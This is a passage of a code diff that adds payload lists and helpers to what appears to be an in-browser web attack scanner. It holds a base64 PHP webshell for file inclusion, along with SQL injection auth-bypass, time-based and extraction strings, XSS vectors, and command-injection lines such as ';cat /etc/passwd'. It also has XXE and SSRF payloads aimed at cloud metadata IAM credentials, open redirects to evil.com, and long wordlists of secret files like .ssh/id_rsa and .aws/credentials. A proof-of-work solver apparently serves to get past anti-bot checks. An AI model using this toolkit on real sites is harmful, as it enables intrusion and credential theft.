+  'php://input','data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=','expect://id','zip://shell.zip%23shell',
+  '/etc/nginx/nginx.conf','/etc/ssh/sshd_config'
+];
+const PATH_TRAV = [
+  '../../../etc/passwd','..%2F..%2F..%2Fetc%2Fpasswd','..%252F..%252F..%252Fetc%252Fpasswd',
+  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd','....//....//....//etc/passwd',
+  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd','../../../windows/win.ini','..\\..\\..\\windows\\win.ini'
+];
+const SQLI_ERR = {
+  mysql: ['you have an error in your sql syntax','warning: mysql','mysql_fetch','mysql_num_rows','com.mysql.jdbc','unclosed quotation mark','sql syntax'],
+  mssql: ['unclosed quotation mark after the character string','incorrect syntax near','microsoft sql server','[sql server]','invalid column name','conversion failed when converting','divide by zero'],
+  oracle: ['ora-','oracle error','plsql','sql command not properly ended','missing expression','oci_execute'],
+  postgres: ['pg_query()','pg_exec()','postgresql.*error','warning.*pg_','syntax error at or near','unterminated quoted string','psqlexception'],
+  sqlite: ['sqlite_','sqlite.exception','unrecognized token','incomplete input'],
+  generic: ['sql syntax','column count doesn\'t match','syntax to use near','unexpected end of sql command']
+};
+const SQLI_ERR_PAY = ["'",'"',"')","'))","'--",'"--',"' OR '1'='1","1'","\\'",'`','`)','1)','1))'];
+const SQLI_BOOL = [
+  ['1 AND 1=1','1 AND 1=2'],["1' AND '1'='1","1' AND '1'='2"],['1 AND 1=1--','1 AND 1=2--'],
+  ["1' AND 1=1--","1' AND 1=2--"],['1 OR 1=1','1 OR 1=2'],["admin'-- -","admin' AND 1=2-- -"]
+];
+const SQLI_TIME = [
+  { pay:"1' AND SLEEP(4)-- -", dbms:'MySQL', thresh:3500 },
+  { pay:"1'; WAITFOR DELAY '0:0:4'--", dbms:'MSSQL', thresh:3500 },
+  { pay:"1';SELECT pg_sleep(4)--", dbms:'PostgreSQL', thresh:3500 },
+  { pay:"1 AND 1=dbms_pipe.receive_message('a',4)", dbms:'Oracle', thresh:3500 }
+];
+const SQLI_EXTRACT = [
+  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
+  "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)-- -",
+  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+  "' UNION SELECT NULL,NULL,@@version,NULL-- -","' UNION SELECT @@version,NULL,NULL-- -"
+];
+const SQLI_AUTH = [
+  ["admin'-- -",'anything'],["admin'#",'anything'],["' OR 1=1-- -",'anything'],
+  ["' OR '1'='1","' OR '1'='1"],["admin' OR '1'='1",'anything'],["') OR ('1'='1",'anything'],
+  [' OR 1=1',''],["admin'--",'']
+];
+const SQLI_STACKED = ["1'; SELECT SLEEP(0)-- -","1'; SELECT 1-- -","1'; EXEC xp_cmdshell('')-- -","1'; WAITFOR DELAY '0:0:0'-- -","1'; SELECT pg_sleep(0)-- -"];
+const XSS_TPL = [
+  "<script>alert('PAYLOAD')<\/script>",
+  "<img src=x onerror=alert('PAYLOAD')>","<svg onload=alert('PAYLOAD')>","<body onload=alert('PAYLOAD')>",
+  "javascript:alert('PAYLOAD')","'><script>alert('PAYLOAD')<\/script>","\"><script>alert('PAYLOAD')<\/script>",
+  "<ScRiPt>alert('PAYLOAD')<\/ScRiPt>","<img src=1 onerror=alert('PAYLOAD')>",
+  "<iframe src=javascript:alert('PAYLOAD')><\/iframe>","<details open ontoggle=alert('PAYLOAD')>",
+  "<input autofocus onfocus=alert('PAYLOAD')>","<video><source onerror=alert('PAYLOAD')>",
+  "<audio src=x onerror=alert('PAYLOAD')>","<marquee onstart=alert('PAYLOAD')>",
+  "%3Cscript%3Ealert('PAYLOAD')%3C/script%3E","<svg/onload=alert('PAYLOAD')>",
+  "</title><script>alert('PAYLOAD')<\/script>","</textarea><script>alert('PAYLOAD')<\/script>"
+];
+const CMDI = [';id','&&id','||id','|id','`id`','$(id)',';cat /etc/passwd','&&cat /etc/passwd',';sleep 5','&&sleep 5','||sleep 5','\nid\n','%0aid%0a',';ls -la','$(sleep 5)',';whoami','&&whoami','||whoami','|whoami','& whoami',';echo $PATH',';env'];
+const CMDI_SIGNS = [/uid=\d+\([^)]+\)/,/root:x:0:0/,/www-data/,/bin\/(?:sh|bash|dash)/,/drwxr-xr/,/total \d/,/\[boot loader\]/i,/Volume in drive/i,/NT AUTHORITY/i];
+function matchSign(text, sign) { return sign instanceof RegExp ? sign.test(text) : text.includes(sign); }
+const SSTI = [['{{7*7}}','49'],['${7*7}','49'],['<%= 7*7 %>','49'],['#{7*7}','49'],["{{7*'7'}}","7777777"],["${7*'7'}","7777777"],['{{config}}','SECRET_KEY']];
+const XXE_PAY_FILE = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;<\/root>';
+const XXE_PAY_OOB  = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]><root/>';
+const REDIR_PARAMS = ['redirect','redirect_to','redirecturl','redirect_uri','return','return_to','url','next','target','dest','destination','redir','go','continue','from','checkout_url','link','location','r','u','ref','forward','jump','callback'];
+const REDIR_PAY = ['//evil.com','//evil.com/','https://evil.com','https://evil.com/','//evil.com%2f..','\\\\evil.com','http://evil.com','/\\evil.com','///evil.com'];
+const SSRF_PARAMS = ['url','uri','path','src','source','dest','destination','redirect','proxy','host','host_url','fetch','load','img','image','api','endpoint','service','request','data','ref','href','from','resource','target','to','open','link','file','document','feed','import','connect','base_url','backend','server','remote','site','page'];
+const SSRF_PAY = [
+  'http://127.0.0.1/','http://localhost/','http://169.254.169.254/','http://169.254.169.254/latest/meta-data/',
+  'http://169.254.169.254/latest/meta-data/iam/security-credentials/','http://[::1]/','http://0.0.0.0/',
+  'http://metadata.google.internal/computeMetadata/v1/','file:///etc/passwd','file:///etc/hosts',
+  'dict://127.0.0.1:6379/info','gopher://127.0.0.1:6379/_PING%0D%0A'
+];
+const SSRF_SIGNS = ['ami-id','instance-id','root:x:0:0','security-credentials','computeMetadata','iam/security','meta-data','+OK','$REDIS'];
+const TAKEOVER_INDICATORS = [
+  ['there is no app configured at that hostname','Heroku'],
+  ['no such app','Heroku/Render'],['this github pages site is disabled','GitHub Pages'],
+  ['such host does not exist in our system','Zendesk'],['the feed has not been found','WordPress.com'],
+  ["the website you were trying to reach doesn't exist",'Webflow'],['project not found','GitLab Pages'],
+  ['domain is not configured','Shopify'],['atlassian account','Atlassian'],
+  ['fastly error: unknown domain','Fastly'],['help.ghost.io','Ghost'],['unbounce.com','Unbounce']
+];
+
+/* ===== WORDPRESS ===== */
+const WP_VULNS = [
+  { path: 'wp-json/wp/v2/users', check: r => r.status === 200 && r.text.includes('"id"'), msg: 'WP REST API user enumeration' },
+  { path: 'xmlrpc.php', check: r => r.status === 200 && r.text.includes('XML-RPC'), msg: 'xmlrpc.php enabled' },
+  { path: 'wp-login.php', check: r => r.status === 200, msg: 'wp-login.php exposed' },
+  { path: 'wp-admin/', check: r => r.status === 200 || r.status === 302, msg: 'wp-admin accessible' },
+  { path: 'readme.html', check: r => r.status === 200 && r.text.toLowerCase().includes('wordpress'), msg: 'readme.html exposes version' },
+  { path: 'wp-content/debug.log', check: r => r.status === 200, msg: 'debug.log exposed' },
+  { path: 'wp-admin/install.php', check: r => r.status === 200 && r.text.toLowerCase().includes('install'), msg: 'Install script accessible' },
+  { path: 'wp-cron.php', check: r => r.status === 200, msg: 'wp-cron.php publicly accessible' },
+  { path: 'wp-json/wp/v2/settings', check: r => r.status === 200, msg: 'WP settings endpoint accessible' }
+];
+const WP_COMMON_PLUGINS = ['akismet','contact-form-7','woocommerce','jetpack','yoast-seo','elementor','wordfence','wpforms-lite','wp-super-cache','w3-total-cache','updraftplus','really-simple-ssl','wp-file-manager','all-in-one-seo-pack','classic-editor','advanced-custom-fields','duplicate-post','redirection','revslider','wp-mail-smtp','query-monitor','gravityforms','nextgen-gallery','tablepress','loginizer','duplicator','wp-rocket','smush','imagify','autoptimize','ninja-forms','formidable','mailchimp-for-wp','rank-math','broken-link-checker','wp-dbmanager','wp-phpmyadmin','wp-hide-login'];
+const WP_COMMON_THEMES = ['twentytwentyfour','twentytwentythree','twentytwentytwo','twentytwentyone','twentytwenty','twentynineteen','twentyseventeen','storefront','astra','divi','avada','flatsome','enfold','betheme','generatepress','kadence','oceanwp','hello-elementor','blocksy','neve','hestia','responsive'];
+
+/* ===== PATHS ===== */
+const ADMIN_PATHS = ['admin','admin/','admin/login','admin/login.php','admin/index.php','admin/dashboard','administrator','administrator/','wp-admin/','wp-login.php','phpmyadmin','phpmyadmin/','pma','pma/','adminer.php','adminer/','dbadmin','cpanel','cpanel/','whm','plesk','webmin','manager/html','host-manager','tomcat','jenkins','jenkins/','gitlab','bitbucket','jira','confluence','kibana','grafana','portainer','panel','panel/','controlpanel','control','control/','login','login/','login.php','signin','signin/','auth/login','user/login','backend','backend/','backoffice','backoffice/','manage','manage/','management','management/','console','console/','dashboard','dashboard/','cms','cms/','portal','portal/','secure','secure/','internal','internal/'];
+const API_PATHS = ['api/','api/v1/','api/v2/','api/v3/','api/users','api/user','api/admin','api/config','api/settings','api/debug','api/test','api/health','api/status','api/info','api/version','api/ping','api/v1/users','api/v2/users','rest/v1/','rest/api/','rest/user','rest/users','graphql','graphiql','__graphql','swagger-ui.html','swagger-ui/','swagger.json','swagger.yaml','api-docs','v2/api-docs','v3/api-docs','.well-known/openid-configuration','.well-known/oauth-authorization-server','oauth/token','oauth/authorize','oauth/userinfo'];
+const SENSITIVE_FILES = ['.env','.env.local','.env.production','.env.backup','.env.dev','.git/config','.git/HEAD','.git/index','.gitignore','.gitconfig','config.php','configuration.php','config.yml','config.yaml','config.json','database.yml','secrets.yml','secrets.json','credentials.json','.bash_history','.bashrc','.ssh/id_rsa','.ssh/authorized_keys','server.key','private.key','private.pem','cert.pem','wp-config.php','wp-config.php.bak','web.config','web.config.bak','backup.sql','db.sql','database.sql','dump.sql','backup.tar.gz','backup.zip','composer.lock','package-lock.json','yarn.lock','phpinfo.php','info.php','test.php','sftp-config.json','docker-compose.yml','Dockerfile','Makefile','Procfile','requirements.txt','README.md','server.log','error.log','access.log','debug.log','.DS_Store','swagger.json','swagger.yaml','openapi.json','openapi.yaml','wp-content/debug.log'];
+const DIR_WORDLIST = ['admin','admin.php','admin/','api','api/v1','api/v2','api/users','backup','backup.sql','backup.zip','.bash_history','.git','.git/HEAD','.git/config','.gitignore','.env','.env.local','.env.production','.htaccess','.htpasswd','config.php','config.json','config.yml','credentials','database.php','db.sql','dump.sql','install.php','log','logs','error.log','password','passwd','phpinfo.php','info.php','phpmyadmin','pma','adminer.php','server-status','actuator','actuator/env','actuator/heapdump','swagger-ui.html','swagger.json','openapi.json','graphql','graphiql','console','dashboard','wp-admin','wp-login.php','wp-config.php','wp-content/','wp-includes/','wp-json/','xmlrpc.php','Dockerfile','docker-compose.yml','package.json','composer.json','requirements.txt','README.md','.DS_Store','web.config','nginx.conf'];
+
+/* ===== SHA-256 ===== */
+const sha256 = (() => {
+  const K = new Uint32Array([0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2]);
+  const H0 = new Uint32Array([0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19]);
+  const rotr = (x, n) => (x >>> n) | (x << (32 - n));
+  const enc = new TextEncoder();
+  return function (str) {
+    const bytes = enc.encode(str), len = bytes.length, bitLen = len * 8;
+    const padded = new Uint8Array((len + 9 + 63) & ~63); padded.set(bytes); padded[len] = 0x80;
+    const view = new DataView(padded.buffer);
+    view.setUint32(padded.length - 8, Math.floor(bitLen / 0x100000000));
+    view.setUint32(padded.length - 4, bitLen >>> 0);
+    const w = new Uint32Array(64), H = new Uint32Array(H0);
+    for (let off = 0; off < padded.length; off += 64) {
+      for (let i = 0; i < 16; i++) w[i] = view.getUint32(off + i * 4);
+      for (let i = 16; i < 64; i++) {
+        const s0 = rotr(w[i-15], 7) ^ rotr(w[i-15], 18) ^ (w[i-15] >>> 3);
+        const s1 = rotr(w[i-2], 17) ^ rotr(w[i-2], 19) ^ (w[i-2] >>> 10);
+        w[i] = (w[i-16] + s0 + w[i-7] + s1) >>> 0;
+      }
+      let a = H[0], b = H[1], c = H[2], d = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
+      for (let i = 0; i < 64; i++) {
+        const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
+        const ch = (e & f) ^ (~e & g);
+        const t1 = (h + S1 + ch + K[i] + w[i]) >>> 0;
+        const S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
+        const maj = (a & b) ^ (a & c) ^ (b & c);
+        const t2 = (S0 + maj) >>> 0;
+        h = g; g = f; f = e; e = (d + t1) >>> 0; d = c; c = b; b = a; a = (t1 + t2) >>> 0;
+      }
+      H[0] = (H[0] + a) >>> 0; H[1] = (H[1] + b) >>> 0; H[2] = (H[2] + c) >>> 0; H[3] = (H[3] + d) >>> 0;
+      H[4] = (H[4] + e) >>> 0; H[5] = (H[5] + f) >>> 0; H[6] = (H[6] + g) >>> 0; H[7] = (H[7] + h) >>> 0;
+    }
+    let hex = '';
+    for (let i = 0; i < 8; i++) hex += H[i].toString(16).padStart(8, '0');
+    return hex;
+  };
+})();
+function zbits(hex) { let n = 0; for (const c of hex) { const v = parseInt(c, 16); if (v === 0) { n += 4; continue; } if (v < 2) n += 3; else if (v < 4) n += 2; else if (v < 8) n += 1; break; } return n; }
+function solvePoW(html) {
+  const t = html.match(/var\s+task\s*=\s*["']([^"']+)["']\s*;/);
+  const n = html.match(/var\s+need\s*=\s*(\d+)\s*;/);
+  if (!t || !n) return null;
+  const task = t[1], need = parseInt(n[1], 10);
+  for (let i = 0; i < 100000000; i++) { const nonce = i.toString(36); if (zbits(sha256(task + nonce)) >= need) return { token: task + '|' + nonce, tries: i }; }
+  return null;
+}
+
+/* ===== BUILTIN PATHS ===== */
+const BUILTIN_PATHS_TEXT = `.git/config
+.git/HEAD
+.git/index
+.git/logs/HEAD
+.git-credentials
+.gitignore
+.svn/entries
+.svn/wc.db
+.env
+.env.local
+.env.dev
+.env.development
+.env.staging
+.env.prod
+.env.production
+.env.backup
+.env.bak
+.env.old
+.env.save
+.env.example
+.envrc
+.aws/credentials
+.aws/config
+.azure/accessTokens.json
+.config/gcloud/application_default_credentials.json
+.ssh/id_rsa
+.ssh/id_dsa
+.ssh/id_ecdsa
+.ssh/id_ed25519
+.ssh/authorized_keys
+.ssh/known_hosts
+.docker/config.json
+.dockercfg
+.npmrc
+.pypirc
+.netrc
+.pgpass
+.my.cnf
+.mongorc.js
+.htpasswd
+.htaccess
+.vault-token
+.infisical.json
+.sops.yaml
+.kube/config
+.terraform/terraform.tfstate
+.terraform.lock.hcl
+.s3cfg
+.passwd-s3fs
+.composer-auth.json
+.cargo/credentials
+.dbeaver/credentials-config.json
+.wp-config.php.swp
+.ftpconfig
+.boto
+.travis.yml
+.appveyor.yml
+.gitlab-ci.yml
+.drone.yml
+.circleci/config.yml
+.github/workflows/ci.yml
+.github/workflows/deploy.yml
+.buildkite/pipeline.yml
+config.json
+config.yaml
+config.yml
+config.js
+config.php
+config.inc.php
+appsettings.json
+composer.json
+composer.lock
+package.json
+package-lock.json
+yarn.lock
+pnpm-lock.yaml
+Gemfile
+Pipfile
+requirements.txt
+pyproject.toml
+go.mod
+go.sum
+pom.xml
+build.gradle
+Cargo.toml
+Procfile
+vercel.json
+netlify.toml
+serverless.yml
+docker-compose.yml
+docker-compose.prod.yml
+docker-compose.dev.yml
+Dockerfile
+Dockerrun.aws.json
+fly.toml
+Chart.yaml
+kustomization.yaml
+main.tf
+variables.tf
+outputs.tf
+terraform.tfvars
+terraform.tfstate
+terraform.tfstate.backup
+values.yaml
+values-prod.yaml
+.editorconfig
+.babelrc
+.eslintrc
+.prettierrc
+.nvmrc
+.python-version
+.ruby-version
+Vagrantfile
+samconfig.toml
+cart.json
+mint.json
+backup
+backup.sh
+backup.sql
+backup.tar.gz
+backup.zip
+dump.sql
+data.sql
+database.sql
+db.sql
+site.sql
+1.sql
+export.sql
+actuator
+actuator/env
+actuator/health
+actuator/heapdump
+actuator/info
+actuator/metrics
+actuator/prometheus
+actuator/threaddump
+actuator/loggers
+actuator/mappings
+jmx-console/
+invoker/JMXInvokerServlet
+rails/info
+rails/info/properties
+rails/info/routes
+sidekiq
+telescope
+horizon
+storage/logs/laravel.log
+_profiler
+_profiler/phpinfo
+_wdt/
+app_dev.php
+info.php
+phpinfo.php
+test.php
+setup.php
+i.php
+apc.php
+phpmyadmin/
+pma/
+adminer.php
+adminer/
+phppgadmin
+pgadmin/login
+configuration.php
+wp-config.php
+wp-config-sample.php
+wp-admin/
+wp-admin/admin-ajax.php
+wp-admin/install.php
+wp-login.php
+wp-json/
+wp-json/wp/v2/users
+wp-json/wp/v2/pages
+wp-json/wp/v2/posts
+wp-json/wc/v3/orders
+wp-json/wc/v3/products
+wp-json/wc/v3/settings
+wp-json/wc/v3/system_status
+wp-json/wc/v3/customers
+wp-json/wc/v3/payment_gateways
+wp-json/wc/store/v1/cart
+wp-json/wc/store/v1/checkout
+wp-content/debug.log
+wp-content/plugins/
+wp-content/themes/
+wp-content/uploads/
+wp-content/backup-db/
+wp-includes/version.php
+wp-cron.php
+xmlrpc.php
+readme.html
+?rest_route=/wp/v2/users
+?author=1
+?wc-ajax=get_refreshed_fragments
+?wc-ajax=checkout
+?wc-ajax=update_order_review
+admin
+admin/login
+admin/index.php
+admin/api.php
+admin/config
+admin/config.json
+admin/error.log
+admin/heap
+admin/heapdump
+admin/metrics
+admin/pprof
+admin/queues
+admin/ready
+admin/roles
+admin/stats
+admin/users
+administrator/
+console
+console/api/login
+dashboard/
+system/console
+system/console/configMgr
+robots.txt
+sitemap.xml
+health
+healthz
+health/live
+health/ready
+metrics
+status
+status.json
+ping
+info
+server-status
+server-info
+nginx_status
+stub_status
+haproxy?stats
+configz
+debug/vars
+debug/pprof
+debug/pprof/cmdline
+debug/pprof/goroutine
+debug/pprof/heap
+debug/pprof/profile
+debug/pprof/trace
+localapi/v0/bugreport
+localapi/v0/metrics
+localapi/v0/status
+config_dump
+api/v1/namespaces
+api/v1/namespaces/default/pods
+api/v1/namespaces/kube-system/configmaps
+api/v1/namespaces/kube-system/secrets
+api/v1/nodes
+api/v1/pods
+api/v1/configmaps
+api/v1/secrets
+api/v1/serviceaccounts
+api/v1/services
+apis/apps/v1/deployments
+apis/apps/v1/statefulsets
+apis/batch/v1/jobs
+apis/batch/v1/cronjobs
+version
+containers/json?all=true
+images/json
+networks
+volumes
+swarm
+pods
+runningpods
+v1.40/containers/json
+v2/_catalog
+v2/tags/list
+_cat/allocation
+_cat/health
+_cat/indices
+_cat/nodes
+_cluster/health
+_cluster/stats
+_count
+_search
+_mapping
+_nodes
+_nodes/stats
+_stats
+_xpack
+_bulk
+_aliases
+app/kibana
+kibana/api/status
+grafana/api/health
+grafana/api/admin/settings
+grafana/api/dashboards
+grafana/api/datasources
+grafana/api/users
+prometheus/api/v1/alerts
+prometheus/api/v1/query
+prometheus/api/v1/rules
+prometheus/api/v1/targets
+prometheus/config
+prometheus/targets
+alertmanager/api/v2/alerts
+alertmanager/api/v2/status
+v1/sys/health
+v1/sys/mounts
+v1/sys/auth
+v1/sys/policies/acl
+v1/sys/seal-status
+v1/secret/data/
+v1/secret/
+v1/kv/
+v1/status/leader
+v1/status/peers
+v1/agent/self
+v1/agent/members
+v1/catalog/nodes
+v1/catalog/services
+v1/namespaces
+v1/auth/token/lookup-self
+v1/acl/tokens
+ui/vault/
+consul/
+ui/
+nomad/
+argocd/api/version
+argocd/api/v1/applications
+argocd/api/v1/clusters
+argocd/api/v1/projects
+argocd/api/v1/repositories
+argocd/api/v1/session
+argocd/api/v1/settings
+jenkins/script
+jenkins/env-vars.html
+script
+scriptText
+jkstatus
+_apis/build/builds
+_apis/connectionData
+_apis/projects
+_apis/git/repositories
+_apis/graph/groups
+_apis/graph/users
+api/v4/projects
+api/v4/groups
+api/v4/users
+api/v4/version
+api/v4/applications
+api/v4/audit_events
+api/v4/jobs
+api/v4/keys
+api/v4/license
+api/v4/metadata
+api/v4/namespaces
+api/v4/personal_access_tokens
+api/v4/runners
+api/v4/sidekiq
+api/v4/todos
+api/v4/webhooks
+artifactory/api/repositories
+artifactory/api/security/apiKey
+artifactory/api/security/users
+artifactory/api/system/configuration
+service/rest/v1/repositories
+service/rest/v1/script
+service/rest/v1/security/users
+service/rest/v1/status
+api/v2.0/projects
+api/v2.0/repositories
+api/v2.0/health
+api/v2.0/search
+api/v2.0/systeminfo
+api/v2.0/users
+kafdrop/
+rabbitmq/api/overview
+api/overview
+api/queues
+api/exchanges
+api/connections
+api/nodes
+api/channels
+api/vhosts
+api/definitions
+mongo-express/
+redis-commander/
+redisinsight/
+couchdb
+_all_dbs
+_utils/
+pghero/connections
+pghero/queries
+_admin/aardvark
+_api/database
+_api/user
+_api/version
+_api/cluster/health
+swagger
+swagger.json
+swagger.yaml
+swagger/index.html
+swagger-ui.html
+swagger-ui/
+swagger-resources
+swagger/doc.json
+swagger/v1/swagger.json
+api-docs
+v2/api-docs
+v3/api-docs
+api/swagger.json
+api/swagger.yaml
+openapi.json
+openapi.yaml
+redoc
+graphql
+graphiql
+graphql/graphql
+graphql/schema.json
+graphql.php
+graphql-console
+graphql-playground
+api/graphql
+latest/meta-data/
+latest/meta-data/iam/security-credentials/
+latest/user-data
+computeMetadata/v1/
+computeMetadata/v1/instance/service-accounts/default/token
+jaeger/api/services
+jaeger/api/traces
+zipkin/api/v2/services
+zipkin/api/v2/spans
+loki/api/v1/labels
+loki/api/v1/query
+loki/api/v1/rules
+loki/config
+loki/ready
+netdata/api/v1/alarms
+netdata/api/v1/charts
+netdata/api/v1/info
+doppler/
+infisical/
+bitwarden/
+1password.env
+superset/health
+superset/api/v1/chart/
+dagster/graphql
+dagit/
+airflow/
+airflow/api/v1/config
+airflow/api/v1/connections
+airflow/api/v1/dags
+airflow/api/v1/health
+airflow/api/v1/variables
+airflow/api/v1/version
+prefect/api/admin/settings
+prefect/api/deployments
+prefect/api/flow_runs
+prefect/api/flows
+mlflow/api/2.0/mlflow/experiments/list
+label-studio/api/projects
+flower/api/tasks
+ray/dashboard/
+ray/api/actors
+ray/api/cluster_status
+ray/api/jobs/
+ray/api/nodes
+spark/api/v1/applications
+spark/history/
+flink/v1/config
+flink/v1/jobs
+flink/v1/overview
+nifi-api/controller/config
+nifi-api/flow/about
+nifi-api/flow/process-groups/root
+nifi-api/flow/status
+zeppelin/api/configurations/all
+zeppelin/api/interpreter
+zeppelin/api/notebook
+hazelcast/health
+hazelcast/rest/cluster
+minio/health/cluster
+minio/health/live
+minio/health/ready
+storage/v1/bucket
+jupyter/tree
+jupyter/api/contents
+jupyter/api/kernels
+jupyter/api/sessions
+jupyterhub/hub/api
+kubeflow/jupyter/
+kubeflow/pipeline/apis/v1beta1/pipelines
+v1/models
+v1/chat/completions
+v1/completions
+v1/embeddings
+ollama/api/tags
+ollama/api/chat
+ollama/api/generate
+langflow/api/v1/
+langgraph/assistants
+langgraph/runs
+langgraph/threads
+langserve/batch
+langserve/invoke
+langserve/playground/
+flowise/api/v1/apikey
+flowise/api/v1/assistants
+flowise/api/v1/chatflows
+flowise/api/v1/credentials
+litellm/health
+litellm/models
+litellm/team/list
+qdrant/cluster
+qdrant/collections
+qdrant/dashboard/
+chroma/api/v1/collections
+chroma/api/v1/heartbeat
+_next/data/
+_buildManifest.js
+_ssgManifest.js
+_payload.json
+__nuxt__/
+_nuxt/
+_worker.js
+@vite/client
+storybook/
+storybook/iframe.html
+livewire/livewire.js
+livewire/update
+sanctum/csrf-cookie
+unleash/api/admin/features
+unleash/api/client/features
+flagsmith/api/v1/environments/
+flagsmith/api/v1/flags/
+flipper/features
+growthbook/api/experiments
+growthbook/api/features
+portainer/
+portainer/api/endpoints
+portainer/api/registries
+portainer/api/settings
+portainer/api/stacks
+portainer/api/status
+portainer/api/users
+rest/api/2/serverInfo
+rest/api/latest/serverInfo
+rest/api/2/dashboard
+rest/api/2/project
+rest/api/content
+rest/api/space
+rest/api/user/current
+rest/credentials
+rest/license
+rest/nodes
+rest/settings
+rest/users
+rest/variables
+rest/workflows
+solr/
+solr/admin/
+solr/admin/cores
+nuxeo/
+cockpit/
+filebrowser/api/login
+filebrowser/api/settings
+filebrowser/api/users
+nextcloud/status.php
+nextcloud/ocs/v2.php/cloud/capabilities
+nextcloud/ocs/v2.php/cloud/users
+remote.php/dav/
+remote/login
+seafile/api2/
+directus/server/health
+directus/server/info
+directus/collections
+directus/fields
+directus/users
+strapi/admin
+strapi/api
+ghost/api/admin/config/
+ghost/api/admin/integrations/
+ghost/api/admin/settings/
+ghost/api/admin/users/
+api/health
+api/health/full
+api/status
+api/v2/health
+api/v2/ping/
+api/v2/ready
+api/v2/buildinfo
+api/v2/me/
+api/v2/users
+api/v2/tokens/
+api/v2/setup
+api/v2/config
+api/v2/dashboards
+api/v3/settings
+api/v3/tokens
+api/v3/users
+api/v3/clusters
+api
+api/version
+api/info
+api/config
+api/settings
+api/users
+api/admin
+api/auth/login
+api/auth/session
+api/auth/signin
+api/auth/csrf
+api/auth/providers
+api/login
+api/logout
+api/token
+api/tokens
+api/refresh
+api/me
+api/self
+api/current
+manager/html
+manager/status
+manager/stats
+manager/logs
+manager/info
+host-manager/html
+owa/
+owa/auth/logon.aspx
+ecp/
+ews/
+autodiscover/
+adfs/ls/
+sap/bc/gui/sap/its/webgui
+CFIDE/administrator/
+crx/de/index.jsp
+crx/packmgr/index.jsp
+libs/granite/core/content/login.html
+.well-known/security.txt
+.well-known/openid-configuration
+.well-known/oauth-authorization-server
+.well-known/jwks.json
+.well-known/webfinger
+.well-known/nodeinfo
+.well-known/ai-plugin.json
+.well-known/assetlinks.json
+.well-known/host-meta
+.well-known/matrix/client
+.well-known/matrix/server
+.well-known/mcp.json
+tmui/login.jsp
+cart
+cart/
+cart.js
+cart/add
+checkout
+checkout/
+checkout/step1
+checkout/payment
+checkout/confirm
+checkout/success
+orders
+orders/
+my-account
+my-account/orders
+my-account/add-payment-method/
+account
+account/orders
+profile
+user
+user/orders
+payment
+payment/
+payments
+payments/
+shop
+shop/
+products
+products/
+products.json
+collections
+collections/
+collections/all
+collections.json
+catalog
+catalog/
+store
+store/
+wishlist
+wishlist/
+basket
+basket/
+transactions
+transactions/
+checkout
+cart
+cart.json`;
+const BUILTIN_PATHS = BUILTIN_PATHS_TEXT.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
+
+/* ===== RUNTIME ===== */
+const $ = id => document.getElementById(id);
+const $$ = sel => document.querySelectorAll(sel);
+let jid = 0, pool = [], WURL = '', poolReady = false, rr = 0;
+const pending = new Map();
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const esc = s => String(s == null ? '' : s).replace(/[&<>"']/g, c => '&#' + c.charCodeAt(0) + ';');
+const humanSize = n => n < 1024 ? n + 'B' : n < 1048576 ? (n / 1024).toFixed(1) + 'KB' : (n / 1048576).toFixed(1) + 'MB';
+const rot = (a, k) => a.map((_, j) => a[(j + k) % a.length]);
+const nowTs = () => { const d = new Date(); return String(d.getHours()).padStart(2, '0') + ':' + String(d.getMinutes()).padStart(2, '0') + ':' + String(d.getSeconds()).padStart(2, '0') + '.' + String(d.getMilliseconds()).padStart(3, '0'); };
+const trunc = (s, n) => { s = String(s); return s.length > n ? s.slice(0, n - 3) + '...' : s; };
+
+const lineCounts = { crawlLog: 0, dorkLog: 0, moduleLog: 0 };
+const cntMap = { crawlLog: 'crawlCnt', dorkLog: 'dorkCnt', moduleLog: 'moduleCnt' };
+function tlog(id, glyph, msg, cls) {
+  const el = $(id); if (!el) return;
+  const line = document.createElement('div');
+  if (cls) line.className = cls;
+  line.textContent = '[' + nowTs() + '] ' + glyph + ' ' + msg;
+  el.appendChild(line);
+  lineCounts[id] = (lineCounts[id] || 0) + 1;
+  const cntEl = $(cntMap[id]); if (cntEl) cntEl.textContent = lineCounts[id] + ' lines';
+  while (el.childNodes.length > 4000) el.removeChild(el.firstChild);
+  el.scrollTop = el.scrollHeight;
+}
+
+function killWorker(w) { w.dead = true; try { w.terminate(); } catch {} for (const [id, p] of pending) if (p.w === w) { pending.delete(id); clearTimeout(p.t); p.res(null); } }
+function callWorker(w, msg, ms) {
